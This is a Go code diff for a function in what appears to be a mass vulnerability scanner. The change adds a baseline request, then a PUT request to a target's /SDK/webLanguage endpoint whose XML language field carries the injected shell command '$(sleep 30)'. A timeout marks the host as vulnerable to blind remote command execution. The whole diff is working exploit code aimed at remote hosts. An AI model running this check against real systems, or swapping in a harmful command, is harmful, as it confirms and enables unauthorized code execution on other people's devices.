@@ -153,11 +153,28 @@ func (target Target) send(url string, request_data interface{}) (HttpResponse, e
 func (target Target) checkBlind() Result {
 	time.Sleep(time.Duration(target.delay) * time.Millisecond)
 
-	data := "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(sleep 17)</language>"
 	full_url := fmt.Sprintf("%v://%v:%v%v", target.proto, target.host, target.port, "/SDK/webLanguage")
 
+	// no payload
+	data := "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>en</language>"
 	req, _ := http.NewRequest(http.MethodPut, full_url, strings.NewReader(data))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
+	req.Header.Set("Accept", "*/*")
+	req.Header.Set("X-Requested-With", "XMLHttpRequest")
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")
+	client := &http.Client{
+		Timeout: 12 * time.Second,
+	}
+	_, err := client.Do(req)
+	if err != nil {
+		return Result{target.host, target.port, ResultInvalid} // invalid if no payload timeout
+	}
 
+	// with payload
+	data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(sleep 30)</language>"
+	req, _ = http.NewRequest(http.MethodPut, full_url, strings.NewReader(data))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
 	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
 	req.Header.Set("Accept", "*/*")
@@ -165,18 +182,18 @@ func (target Target) checkBlind() Result {
 	req.Header.Set("Accept-Encoding", "gzip, deflate")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")
 
-	client := &http.Client{
+	client = &http.Client{
 		Timeout: 15 * time.Second,
 	}
 
-	_, err := client.Do(req)
+	_, err = client.Do(req)
 	if err != nil {
 		if strings.Contains(err.Error(), "context deadline exceeded") {
-			return Result{target.host, target.port, ResultBlindValid}
+			return Result{target.host, target.port, ResultBlindValid} // valid if payload timeout
 		}
 		return Result{target.host, target.port, ResultErr}
 	}
-	return Result{target.host, target.port, ResultInvalid}
+	return Result{target.host, target.port, ResultInvalid} // invalid if payload no timeout
 }
 
 func (target Target) checkTarget() Result {
